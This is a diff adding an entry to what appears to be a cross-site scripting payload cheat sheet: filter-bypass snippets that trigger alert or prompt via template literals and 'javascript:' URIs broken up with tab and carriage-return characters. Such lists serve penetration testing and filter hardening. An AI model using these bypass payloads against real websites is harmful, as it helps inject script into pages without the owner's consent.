@@ -564,6 +564,14 @@ content['alert'](6)
 [12].forEach(alert);
 ```
 
+Bypass using an alternate way to execute an alert - [@quanyang](https://twitter.com/quanyang/status/1078536601184030721)
+```javascript
+prompt`${document.domain}`
+document.location='java\tscript:alert(1)'
+document.location='java\rscript:alert(1)'
+document.location='java\tscript:alert(1)'
+```
+
 Bypass using an alternate way to execute an alert - [@404death](https://twitter.com/404death/status/1011860096685502464)
 
 ```javascript
